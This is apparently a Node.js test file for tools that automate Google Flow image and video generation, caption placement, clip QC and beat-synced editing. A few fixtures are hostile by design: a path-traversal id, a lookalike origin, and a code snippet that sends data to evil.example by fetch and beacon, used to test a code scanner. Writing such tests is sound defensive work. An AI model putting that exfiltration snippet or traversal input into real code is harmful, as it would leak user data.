import test from 'node:test';
import assert from 'node:assert/strict';
import {
  routes, parseFlowUrl, projectIdFromUrl, assertUuid, resolveModel, resolveRatio, resolveCount, stripEmoji,
  waitForNoBackdrop, assetKind, attachReferenceImages, matchesUploadedAsset, ADD_TO_PROMPT,
} from '../src/navigation/flow-ui.js';
import { handleGenerateImage, pickConfirmLabel } from '../src/tools/generate-image.js';
import { handleGenerateVideo } from '../src/tools/generate-video.js';
import { handleEditVideo } from '../src/tools/edit-video.js';
import { handleUseGridArchitect } from '../src/tools/grid-architect.js';
import { handleImportCharacter } from '../src/tools/import-character.js';
import { handleDiscoverUi } from '../src/tools/discover-ui.js';
import { handleStitchVideos, canvasFor, subtitleFilter } from '../src/tools/stitch-videos.js';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { resolveFrameTime } from '../src/tools/save-frame.js';
import { planCuts, analyseTrack, handleBeatSync, handleAnalyzeBeats } from '../src/tools/beat-sync.js';
import { handleQcReport, parseDetectors, evaluate } from '../src/tools/qc-report.js';
import { validateToolPrompt, scanToolCode, handleCreateTool, handleRefineTool } from '../src/tools/create-tool.js';
import { setPage, ensureOwnTmpDir } from '../src/browser/connect.js';

const ID = '0e45cd4a-7c8b-4860-8def-fe2fbd6e9eb8';
const ID2 = '12c6024c-946b-48e6-a653-54048345f568';

test.beforeEach(() => setPage({ url: () => { throw new Error('browser must not be touched by validation'); } }));
test.afterEach(() => setPage(null));

test('parseFlowUrl classifies Flow routes and rejects other origins', () => {
  assert.deepEqual(parseFlowUrl('https://flow.google.com/?pli=1'), { kind: 'home', projectId: null, section: null, itemId: null });
  assert.equal(parseFlowUrl('https://flow.google.com/about').kind, 'about');
  assert.deepEqual(parseFlowUrl(`https://flow.google.com/project/${ID}`), { kind: 'project', projectId: ID, section: 'project', itemId: null });
  assert.deepEqual(parseFlowUrl(`https://flow.google.com/project/${ID}/edit/${ID2}`), { kind: 'project', projectId: ID, section: 'edit', itemId: ID2 });
  assert.deepEqual(parseFlowUrl(`https://flow.google.com/project/${ID}/tool/${ID2}?mode=APP`), { kind: 'project', projectId: ID, section: 'tool', itemId: ID2 });
  assert.equal(parseFlowUrl(`https://flow.google.com/project/${ID}/tools`).section, 'tools');
  assert.equal(parseFlowUrl(`https://flow.google.com/project/${ID}/character`).section, 'character');
  assert.equal(parseFlowUrl('https://flow.google.com.evil.example/project/' + ID).kind, 'external');
  assert.equal(parseFlowUrl('http://flow.google.com/').kind, 'external');
  assert.equal(parseFlowUrl('https://flow.google.com/project/not-a-uuid').kind, 'other');
  assert.equal(parseFlowUrl('nonsense').kind, 'invalid');
  assert.equal(projectIdFromUrl(`https://flow.google.com/project/${ID}/trash`), ID);
  assert.equal(projectIdFromUrl('https://flow.google.com/'), null);
});

test('routes only build URLs from real UUIDs on the Flow origin', () => {
  assert.equal(routes.project(ID), `https://flow.google.com/project/${ID}`);
  assert.equal(routes.media(ID, ID2), `https://flow.google.com/project/${ID}/edit/${ID2}`);
  assert.equal(routes.characterItem(ID, ID2), `https://flow.google.com/project/${ID}/character/${ID2}`);
  assert.throws(() => routes.project('../../etc/passwd'), /Invalid project id/);
  assert.throws(() => routes.scene(ID, `${ID2}/../x`), /Invalid scene id/);
  assert.equal(assertUuid(ID.toUpperCase()), ID);
});

test('models, ratios and counts resolve against what the live UI offers', () => {
  assert.equal(resolveModel('image', undefined), 'Nano Banana 2.1');
  assert.equal(resolveModel('image', 'Nano Banana 2'), 'Nano Banana 2.1');
  assert.equal(resolveModel('image', '🍌 nano banana pro'), 'Nano Banana Pro');
  assert.equal(resolveModel('image', 'Imagen 4'), null);
  assert.equal(resolveModel('video', 'Omni Flash'), 'Omni 1.2 Flash');
  assert.equal(resolveModel('video', 'Omni Legacy'), 'Omni 1.1 Flash');
  assert.equal(resolveModel('video', 'veo 3.1 - quality'), 'Veo 3.1 - Quality');
  assert.equal(resolveModel('video', 'Nano Banana 2'), null);
  assert.equal(resolveRatio('image', '4:3', '1:1'), '4:3');
  assert.equal(resolveRatio('image', undefined, '1:1'), '1:1');
  assert.equal(resolveRatio('video', '1:1', '16:9'), null);
  assert.equal(resolveCount(undefined), 1);
  assert.equal(resolveCount('3'), 3);
  assert.equal(resolveCount(5), null);
  assert.equal(resolveCount(1.5), null);
  assert.equal(stripEmoji('🍌 Nano Banana 2.1'), 'Nano Banana 2.1');
});

test('flow_generate_image validates before touching the browser or spending anything', async () => {
  await assert.rejects(() => handleGenerateImage({}), /prompt is required/);
  await assert.rejects(() => handleGenerateImage({ prompt: 'x'.repeat(4001) }), /too long/);
  await assert.rejects(() => handleGenerateImage({ prompt: 'a cat', model: 'Imagen 4' }), /not available/);
  await assert.rejects(() => handleGenerateImage({ prompt: 'a cat', ratio: '21:9' }), /not available/);
  await assert.rejects(() => handleGenerateImage({ prompt: 'a cat', quantity: 9 }), /quantity/);
  await assert.rejects(() => handleGenerateImage({ prompt: 'a short video of a cat', auto_confirm: true }), /BLOCKED/);
  await assert.rejects(() => handleGenerateImage({ prompt: 'animate this logo', auto_confirm: true }), /BLOCKED/);
});

test('flow_generate_video and grid architect validate their inputs', async () => {
  await assert.rejects(() => handleGenerateVideo({}), /prompt is required/);
  await assert.rejects(() => handleGenerateVideo({ prompt: 'a cat', model: 'Nano Banana 2' }), /not available/);
  // cost rail: the premium tier must not be reachable by accident (default model is Omni 1.2 Flash)
  await assert.rejects(() => handleGenerateVideo({ prompt: 'a cat', model: 'Veo 3.1 - Quality' }), /refused by default/);
  await assert.rejects(() => handleGenerateVideo({ prompt: 'a cat', model: 'quality' }), /refused by default/);
  await assert.rejects(() => handleGenerateVideo({ prompt: 'a cat', model: 'Veo 3.1 - Quality' }), /Omni 1\.2 Flash/);
  await assert.rejects(() => handleGenerateVideo({ prompt: 'a cat', ratio: '1:1' }), /not available for video/);
  await assert.rejects(() => handleGenerateVideo({ prompt: 'a cat', duration: -2 }), /duration/);
  await assert.rejects(() => handleUseGridArchitect({}), /theme_prompt is required/);
  await assert.rejects(() => handleUseGridArchitect({ theme_prompt: 't', engine: 'Imagen 4' }), /not available in Grid Architect/);
  await assert.rejects(() => handleUseGridArchitect({ theme_prompt: 't', shot_prompts: ['1', '2', '3', '4', '5'] }), /at most 4/);
  await assert.rejects(() => handleUseGridArchitect({ theme_prompt: 't', visual_logic: 'Colour Pop' }), /Visual logic/);
});

test('character import and discovery reject bad input without a browser', async () => {
  await assert.rejects(() => handleImportCharacter({}), /not found/);
  await assert.rejects(() => handleImportCharacter({ file_path: '/nonexistent/char.json' }), /not found/);
  await assert.rejects(() => handleDiscoverUi({ page: 'definitely-not-a-page' }), /Unknown page/);
});

test('the permission card resolves to the real radio option, never the pre-selected one', () => {
  // exactly what the live flow-permission-message renders
  const live = ['Approve', 'Always approve', 'Reject'];
  assert.equal(pickConfirmLabel(live), 'Approve');
  assert.equal(pickConfirmLabel(['Always approve']), null, 'an already-answered card must not be re-clicked');
  const frozen = live.map((label) => ({ label, frozen: true, visible: true }));
  assert.equal(frozen.filter((o) => !o.frozen && o.visible).length, 0, 'a read-only card offers nothing clickable');
  const fresh = live.map((label, i) => ({ label, frozen: false, visible: true, checked: i === 1 }));
  // Flow pre-selects "Always approve" — that pre-selection must be ignored
  assert.equal(pickConfirmLabel(fresh.filter((o) => !o.frozen).map((o) => o.label)), 'Approve');
});

test('the automated confirm click never selects "Always approve"', () => {
  assert.equal(pickConfirmLabel(['check Approve', 'check Always approve', 'close Reject']), 'check Approve');
  assert.equal(pickConfirmLabel(['check Always approve', 'close Reject']), null);
  assert.equal(pickConfirmLabel(['Reject']), null);
  assert.equal(pickConfirmLabel([]), null);
  assert.equal(pickConfirmLabel(['Confirm', 'Always approve']), 'Confirm');
});

test('waitForNoBackdrop waits out a leftover menu backdrop', async () => {
  let polls = 0;
  const page = {
    locator: () => ({ count: async () => (polls++ < 2 ? 1 : 0) }),
    waitForTimeout: async () => {},
  };
  assert.equal(await waitForNoBackdrop(page, 1000), true);
  assert.equal(polls, 3);

  const stuck = { locator: () => ({ count: async () => 1 }), waitForTimeout: async () => {} };
  const t0 = Date.now();
  assert.equal(await waitForNoBackdrop(stuck, 300), false);
  assert.ok(Date.now() - t0 >= 250);
});

test('reference assets accept images and videos, and reject everything else', async () => {
  assert.equal(assetKind('/tmp/still.jpg'), 'image');
  assert.equal(assetKind('/tmp/still.PNG'), 'image');
  assert.equal(assetKind('/tmp/clip.mp4'), 'video');
  assert.equal(assetKind('/tmp/clip.MOV'), 'video');
  assert.equal(assetKind('/tmp/clip.3gp'), 'video');
  assert.equal(assetKind('/tmp/clip.avi'), 'video');
  // Flow's own file chooser does not accept webm, so neither do we
  assert.equal(assetKind('/tmp/clip.webm'), null);
  assert.equal(assetKind('/tmp/still.gif'), 'image');
  assert.equal(assetKind('/tmp/still.heic'), 'image');
  assert.equal(assetKind('/tmp/notes.txt'), null);
  assert.equal(assetKind('/tmp/noext'), null);

  await assert.rejects(() => attachReferenceImages({}, ['/definitely/not/here.jpg']), /Asset not found/);
  await assert.rejects(() => attachReferenceImages({}, ['package.json']), /Unsupported asset type/);
});

test('flow_edit_video demands an edit prompt before it touches the browser', async () => {
  await assert.rejects(() => handleEditVideo({}), /edit_prompt is required/);
  await assert.rejects(() => handleEditVideo({ edit_prompt: '   ' }), /edit_prompt is required/);
  await assert.rejects(() => handleEditVideo({ edit_prompt: 'x'.repeat(4001) }), /too long/);
});

test('uploaded asset tiles are recognised by name, hash prefix or file name', () => {
  const asset = { name: '5d7de9f6_clip.mp4', hashPrefix: '5d7de9f6', baseName: 'clip.mp4' };
  assert.equal(matchesUploadedAsset('5d7de9f6_clip.mp4', asset), true);
  assert.equal(matchesUploadedAsset('5d7de9f6_flow_19fc11f8_1.jpg', { name: 'x', hashPrefix: '5d7de9f6', baseName: 'flow_19fc11f8_1.jpg' }), true);
  assert.equal(matchesUploadedAsset('clip.mp4 (transcoded)', asset), true);
  assert.equal(matchesUploadedAsset('Paper lantern drifting over lake', asset), false);
  assert.equal(matchesUploadedAsset('', asset), false);
});

// --- making short clips longer: Flow ships no Extend control, so clips are joined locally ---
test('flow_stitch_videos needs at least two clips', async () => {
  await assert.rejects(() => handleStitchVideos({ files: ['one.mp4'] }), /at least two/);
});

test('flow_stitch_videos refuses files that do not exist', async () => {
  await assert.rejects(() => handleStitchVideos({ files: ['/nope/a.mp4', '/nope/b.mp4'] }), /File not found/);
});

test('flow_stitch_videos fits clips to the asked aspect without upscaling', () => {
  const probes = [{ width: 1280, height: 720 }, { width: 1280, height: 720 }];
  assert.deepEqual(canvasFor(probes, '9:16', 1080), { width: 406, height: 720 });
  assert.deepEqual(canvasFor(probes, '16:9', 1080), { width: 1280, height: 720 });
  assert.deepEqual(canvasFor([{ width: 1920, height: 1080 }], '9:16', 1080), { width: 608, height: 1080 });
  assert.deepEqual(canvasFor(probes, null, 1080), { width: 1280, height: 720 });
});

// --- captions must clear the Reels/TikTok UI: a bare subtitles= filter lands ~94% down a 1080x1920 frame ---
function hasFfmpeg() { try { execFileSync('ffmpeg', ['-version'], { stdio: 'ignore' }); return true; } catch { return false; } }

function captionBand(position, width, height) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'flow-sub-'));
  try {
    // awkward name on purpose: quote, colon, comma, brackets, space must all survive filter escaping
    const srt = path.join(dir, "it's, a:test [1].srt");
    fs.writeFileSync(srt, '1\n00:00:00,000 --> 00:00:02,000\nHOODIE DROP\n');
    const raw = path.join(dir, 'f.raw');
    execFileSync('ffmpeg', ['-v', 'error', '-y', '-f', 'lavfi', '-i', `color=c=gray:s=${width}x${height}:d=1:r=24`,
      '-vf', subtitleFilter(srt, width, height, position), '-frames:v', '1', '-f', 'rawvideo', '-pix_fmt', 'gray', raw]);
    const d = fs.readFileSync(raw);
    const bg = d[0];
    let first = -1, last = -1;
    for (let y = 0; y < height; y += 1) {
      for (let x = 0; x < width; x += 1) {
        if (Math.abs(d[y * width + x] - bg) > 40) { if (first < 0) first = y; last = y; break; }
      }
    }
    return { first, last, centre: (first + last) / 2 / height };
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
}

test('subtitleFilter lifts portrait captions out of the platform UI zone (and still escapes odd paths)', { skip: !hasFfmpeg() }, () => {
  const safe = captionBand('safe', 1080, 1920);
  assert.ok(safe.first >= 0, 'captions were drawn');
  assert.ok(safe.centre > 0.5 && safe.centre < 0.66, `safe centre ${safe.centre}`);
  assert.ok(safe.last / 1920 < 0.65, 'text ends above the bottom 35% UI zone');
  const bottom = captionBand('bottom', 1080, 1920);
  assert.ok(bottom.centre > 0.9, `bottom keeps the legacy placement (${bottom.centre})`);
});

test('subtitleFilter escapes filter metacharacters in the path', () => {
  const f = subtitleFilter("/tmp/a:b,c[1];d'e.srt", 1080, 1920);
  assert.match(f, /^subtitles=filename='/);
  assert.ok(!/[^\\]:b/.test(f.split("original_size")[0]), 'colon in path is escaped');
});

test('flow_save_frame resolves first, middle, last and a timestamp', () => {
  assert.equal(resolveFrameTime('first', 4.01), 0);
  assert.equal(resolveFrameTime('middle', 4), 2);
  assert.equal(resolveFrameTime('last', 4), 3.94);
  assert.equal(resolveFrameTime('2', 4), 2);
  assert.equal(resolveFrameTime('99', 4), 4);
});

test('flow_save_frame rejects nonsense instead of guessing', () => {
  assert.throws(() => resolveFrameTime('somewhere', 4), /Unsupported at/);
});

// --- building Flow Tools: free to build, never run by us ---
test('validateToolPrompt bounds the prompt and reports what running the tool may cost', () => {
  assert.throws(() => validateToolPrompt('too short'), /too short/);
  assert.throws(() => validateToolPrompt('x'.repeat(8001)), /too long/);
  assert.match(validateToolPrompt('Create a tool called "Safe Zone Checker". No credits, no generation. Inputs: an image.').credits_when_run, /declared free/);
  assert.match(validateToolPrompt('Create a tool that calls Nano Banana to generate images from a product shot.').credits_when_run, /may spend credits/);
  assert.match(validateToolPrompt('Create a tool that renames files in a list you paste in.').credits_when_run, /unknown/);
});

test('scanToolCode flags network and dynamic code, but passes plain Flow SDK use', () => {
  const clean = scanToolCode("import { Flow } from 'flow-sdk';\nawait Flow.download({ base64, mimeType: 'image/png', filename: 'a.png' });\nconst m = await Flow.media.select();");
  assert.equal(clean.clean, true);
  assert.deepEqual(clean.flow_sdk_calls.sort(), ['Flow.download', 'Flow.media.select']);
  const bad = scanToolCode("fetch('https://evil.example/x?d=' + data); new Image().src='https://t.example/p'; eval(code); navigator.sendBeacon('u')");
  assert.equal(bad.clean, false);
  const names = bad.flags.map((f) => f.flag);
  for (const n of ['fetch', 'eval', 'sendBeacon', 'Image().src beacon']) assert.ok(names.includes(n), n);
  assert.ok(bad.external_urls.includes('https://evil.example/x?d='));
});

test('flow_create_tool / flow_refine_tool validate before touching the browser', async () => {
  await assert.rejects(() => handleCreateTool({ prompt: 'short' }), /too short/);
  await assert.rejects(() => handleRefineTool({ message: 'ok' }), /too short/);
});

// --- QC report ---
function makeClip(dir, name, { black = false, w = 1080, h = 1920, secs = 3 } = {}) {
  const file = path.join(dir, name);
  const v = black
    ? `color=c=black:s=${w}x${h}:d=${secs}:r=30`
    : `testsrc2=s=${w}x${h}:d=${secs}:r=30`;
  execFileSync('ffmpeg', ['-v', 'error', '-y', '-f', 'lavfi', '-i', v, '-f', 'lavfi', '-i', `sine=frequency=440:duration=${secs}:sample_rate=48000`,
    '-c:v', 'libx264', '-pix_fmt', 'yuv420p', '-c:a', 'aac', '-ar', '48000', '-shortest', file]);
  return file;
}

test('parseDetectors reads black, freeze, silence and loudness from ffmpeg stderr', () => {
  const d = parseDetectors('[blackdetect @ 0x1] black_start:1.5 black_end:2.5 black_duration:1\n[freezedetect @ 0x2] lavfi.freezedetect.freeze_start: 4.2\n[freezedetect @ 0x2] lavfi.freezedetect.freeze_duration: 0.8\n[silencedetect @ 0x3] silence_start: 0.5\n[silencedetect @ 0x3] silence_duration: 1.25\nSummary:\n\n  Integrated loudness:\n    I:         -14.3 LUFS\n    Threshold: -24.3 LUFS\n\n  Loudness range:\n    LRA:         3.2 LU\n\n  True peak:\n    Peak:       -1.5 dBFS\n');
  assert.deepEqual(d.black, [{ start: 1.5, end: 2.5, seconds: 1 }]);
  assert.deepEqual(d.freeze, [{ start: 4.2, seconds: 0.8 }]);
  assert.deepEqual(d.silence, [{ start: 0.5, seconds: 1.25 }]);
  assert.deepEqual(d.loudness, { integrated_lufs: -14.3, lra: 3.2, true_peak_dbtp: -1.5 });
});

test('evaluate separates hard failures from warnings', () => {
  const meta = { codec: 'h264', profile: 'High', pix_fmt: 'yuv420p', width: 720, height: 1280, r_fps: 30, avg_fps: 30, duration: 15, size_mb: 12, audio: { codec: 'aac', sample_rate: 48000, channels: 2 } };
  const ok = evaluate(meta, { black: [], freeze: [], silence: [], loudness: { integrated_lufs: -14, lra: 4, true_peak_dbtp: -2 } });
  assert.equal(ok.passed_hard_checks, true);
  assert.deepEqual(ok.warnings, ['resolution']);   // 720x1280 is the right ratio but under 1080x1920
  const bad = evaluate({ ...meta, codec: 'hevc', width: 1920, height: 1080 }, { black: [{ start: 1, end: 2, seconds: 1 }], freeze: [], silence: [], loudness: { integrated_lufs: -22, lra: 4, true_peak_dbtp: 0 } }, { targetSeconds: 30 });
  assert.equal(bad.passed_hard_checks, false);
  for (const id of ['codec', 'aspect', 'duration', 'black_frames']) assert.ok(bad.hard_fails.includes(id), id);
  for (const id of ['loudness', 'true_peak']) assert.ok(bad.warnings.includes(id), id);
});

test('flow_qc_report runs on real clips: a good clip passes, a black clip fails', { skip: !hasFfmpeg() }, async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'flow-qc-'));
  try {
    const good = await handleQcReport({ file: makeClip(dir, 'good.mp4'), target_seconds: 3 });
    assert.equal(good.status, 'hard_checks_passed', JSON.stringify(good.hard_fails));
    assert.ok(good.contact_sheet && fs.existsSync(good.contact_sheet));
    assert.ok(fs.existsSync(good.report_file));
    assert.ok(Number.isFinite(good.loudness.integrated_lufs));
    const dark = await handleQcReport({ file: makeClip(dir, 'dark.mp4', { black: true }) });
    assert.equal(dark.status, 'hard_checks_FAILED');
    assert.ok(dark.hard_fails.includes('black_frames'));
    const wide = await handleQcReport({ file: makeClip(dir, 'wide.mp4', { w: 1280, h: 720 }) });
    assert.ok(wide.hard_fails.includes('aspect'));
    for (const r of [good, dark, wide]) { fs.rmSync(r.report_file, { force: true }); if (r.contact_sheet) fs.rmSync(r.contact_sheet, { force: true }); }
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test('flow_qc_report rejects missing files and bad aspect values', async () => {
  await assert.rejects(() => handleQcReport({ file: '/nope/x.mp4' }), /File not found/);
  await assert.rejects(() => handleQcReport({ file: '/nope/x.mp4', aspect: '2:1' }), /File not found/);
});

// --- downloads must not depend on the TMPDIR the server was launched with ---
test('ensureOwnTmpDir replaces an inherited TMPDIR with a short private dir', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'flow-root-'));
  try {
    const env = { TMPDIR: '/home/someone-else/profiles/ted/cache/scratch' };
    const dir = ensureOwnTmpDir(root, env);
    assert.equal(env.TMPDIR, dir);
    assert.ok(path.isAbsolute(dir));
    // Chrome builds its process-singleton socket at $TMPDIR/com.google.Chrome.XXXXXX/SingletonSocket
    // and AF_UNIX paths are capped at 108 bytes; a longer TMPDIR makes Chrome abort at startup with
    // "Socket path too long", which surfaced as flow_connect's "CDP endpoint did not become ready".
    const socket = '/com.google.Chrome.XXXXXX/SingletonSocket';
    assert.ok(dir.length + socket.length <= 108, `TMPDIR too long for Chrome's singleton socket: ${dir}`);
    assert.ok(fs.statSync(dir).isDirectory());
    assert.equal(fs.statSync(dir).mode & 0o077, 0, 'private (0700)');
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
});

test('ADD_TO_PROMPT matches the picker preview button and nothing broader', () => {
  assert.equal(ADD_TO_PROMPT.test('Add to prompt'), true);
  assert.equal(ADD_TO_PROMPT.test('  add to prompt '), true);
  assert.equal(ADD_TO_PROMPT.test('Add to prompt box'), false);
  assert.equal(ADD_TO_PROMPT.test('Upload media'), false);
});

test('evaluate treats a short black tail as an end-card warning but mid-video black as a hard fail', () => {
  const meta = { codec: 'h264', profile: 'High', pix_fmt: 'yuv420p', width: 1080, height: 1920, r_fps: 24, avg_fps: 24, duration: 15, size_mb: 9, audio: { codec: 'aac', sample_rate: 48000, channels: 2 } };
  const quiet = { freeze: [], silence: [], loudness: { integrated_lufs: -14, lra: 5, true_peak_dbtp: -2 } };
  const tail = evaluate(meta, { ...quiet, black: [{ start: 13.5, end: 15, seconds: 1.5 }] });
  assert.equal(tail.passed_hard_checks, true);
  assert.deepEqual(tail.warnings, ['end_card_black']);
  const mid = evaluate(meta, { ...quiet, black: [{ start: 6, end: 7, seconds: 1 }] });
  assert.deepEqual(mid.hard_fails, ['black_frames']);
  const longTail = evaluate(meta, { ...quiet, black: [{ start: 8, end: 15, seconds: 7 }] });
  assert.deepEqual(longTail.hard_fails, ['black_frames'], 'a 7s black tail is not an end card');
  const allBlack = evaluate({ ...meta, duration: 3 }, { ...quiet, black: [{ start: 0, end: 3, seconds: 3 }] });
  assert.deepEqual(allBlack.hard_fails, ['black_frames'], 'an entirely black clip is not an end card');
});

test('subtitleFilter accepts a numeric caption height and keeps presets', () => {
  assert.match(subtitleFilter('/tmp/a.srt', 1080, 1920, 0.42), /MarginV=121/);        // 288 * 0.42
  assert.match(subtitleFilter('/tmp/a.srt', 1080, 1920, '0.42'), /MarginV=121/);
  assert.match(subtitleFilter('/tmp/a.srt', 1080, 1920, 5), /MarginV=230/);           // clamped to 0.8
  assert.match(subtitleFilter('/tmp/a.srt', 1080, 1920), /MarginV=107/);              // portrait default 0.37
  assert.equal(subtitleFilter('/tmp/a.srt', 1080, 1920, 'bottom'), "subtitles=filename='/tmp/a.srt'");
});

// --- beat detection and beat-synced cuts ---
function clickTrack(dir, bpm, offset, secs = 20) {
  const SR = 22050, n = SR * secs, beat = 60 / bpm;
  const buf = new Float32Array(n);
  for (let t = offset, k = 0; t < secs; t += beat, k += 1) {
    const i = Math.round(t * SR);
    for (let j = 0; j < 0.12 * SR && i + j < n; j += 1) { const x = j / SR; buf[i + j] += 0.9 * Math.sin(2 * Math.PI * (55 + 90 * Math.exp(-x * 40)) * x) * Math.exp(-x * 22); }
    const h = Math.round((t + beat / 2) * SR);                       // loud off-beat "hat" noise, the usual phase trap
    let seed = k * 7919 + 13;
    for (let j = 0; j < 0.03 * SR && h + j < n; j += 1) { seed = (seed * 1103515245 + 12345) & 0x7fffffff; buf[h + j] += 0.2 * ((seed / 0x7fffffff) * 2 - 1) * Math.exp((-j / SR) * 120); }
  }
  const file = path.join(dir, `click-${bpm}.wav`);
  execFileSync('ffmpeg', ['-v', 'error', '-y', '-f', 'f32le', '-ar', String(SR), '-ac', '1', '-i', '-', file], { input: Buffer.from(buf.buffer) });
  return file;
}

test('planCuts places cuts on beats and rejects impossible windows', () => {
  const beats = Array.from({ length: 33 }, (_, i) => i * 0.5);        // 120 BPM
  assert.deepEqual(planCuts(beats, { total: 8, everyBeats: 4 }), [2, 2, 2, 2]);
  assert.deepEqual(planCuts(beats, { total: 8, everyBeats: 8 }), [4, 4]);
  assert.deepEqual(planCuts(beats, { start: 1, total: 4, everyBeats: 2 }).reduce((a, b) => a + b, 0), 4);
  assert.throws(() => planCuts(beats, { total: 0 }), /total/);
  assert.throws(() => planCuts([0], { total: 4 }), /Not enough beats/);
});

test('analyseTrack finds tempo and beat phase of a click track despite loud off-beat noise', { skip: !hasFfmpeg() }, () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'flow-beat-'));
  try {
    for (const [bpm, off] of [[120, 0.0], [128, 0.21], [100, 0.37]]) {
      const r = analyseTrack(clickTrack(dir, bpm, off));
      assert.ok(Math.abs(r.bpm - bpm) <= 0.5, `bpm ${r.bpm} vs ${bpm}`);
      const beat = 60 / bpm;
      const errs = r.beats.slice(0, 20).map((b) => Math.abs(b - (off + Math.round((b - off) / beat) * beat)));
      assert.ok(Math.max(...errs) < 0.05, `max beat error ${Math.max(...errs)} at ${bpm} BPM`);
    }
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test('flow_beat_sync cuts on whole beats and mixes the music', { skip: !hasFfmpeg() }, async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'flow-sync-'));
  try {
    const a = makeClip(dir, 'a.mp4', { w: 360, h: 640, secs: 4 }), b = makeClip(dir, 'b.mp4', { w: 360, h: 640, secs: 4 });
    const music = clickTrack(dir, 120, 0.0, 12);
    const r = await handleBeatSync({ music, clips: [{ file: a, beats: 4 }, { file: b, beats: 4 }], width: 360, height: 640, output_name: 'unit-beatsync' });
    assert.equal(r.status, 'success');
    assert.ok(Math.abs(r.bpm - 120) <= 0.5);
    assert.equal(r.cuts.length, 1);
    assert.ok(Math.abs(r.cuts[0] - 4 * r.beat_seconds) < 0.001, 'the cut is exactly four beats in');
    assert.ok(Math.abs(r.total_seconds - 8 * r.beat_seconds) < 0.001);
    const dur = Number(execFileSync('ffprobe', ['-v', 'error', '-show_entries', 'format=duration', '-of', 'csv=p=0', r.output], { encoding: 'utf-8' }));
    assert.ok(Math.abs(dur - r.total_seconds) < 0.1, `file is ${dur}s`);
    fs.rmSync(r.output, { force: true }); fs.rmSync(r.output.replace(/\.mp4$/, '.beatsync.json'), { force: true });
    // end card + ducking path
    const logo = path.join(dir, 'logo.png');
    execFileSync('ffmpeg', ['-v', 'error', '-y', '-f', 'lavfi', '-i', 'color=c=white:s=200x80:d=1,format=rgba', '-frames:v', '1', logo]);
    const r2 = await handleBeatSync({ music, clips: [{ file: a, beats: 4 }, { file: b, beats: 4 }], width: 360, height: 640, output_name: 'unit-beatsync2', logo, logo_beats: 3, duck_music: true, music_volume: 0.5, clip_audio_volume: 1 });
    assert.equal(r2.duck_music, true);
    assert.equal(r2.logo, logo);
    assert.ok(fs.existsSync(r2.output));
    fs.rmSync(r2.output, { force: true }); fs.rmSync(r2.output.replace(/\.mp4$/, '.beatsync.json'), { force: true });
    await assert.rejects(() => handleBeatSync({ music, clips: [{ file: a, beats: 40 }] }), /needs .* of music/);
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test('beat tools reject missing inputs', async () => {
  await assert.rejects(() => handleAnalyzeBeats({ file: '/nope.wav' }), /File not found/);
  await assert.rejects(() => handleBeatSync({ music: '/nope.wav', clips: [] }), /Music file not found/);
});
